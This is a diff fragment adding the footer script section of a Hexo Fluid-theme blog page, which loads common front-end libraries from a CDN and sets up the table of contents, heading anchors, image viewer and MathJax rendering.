+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/mui-fluid.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
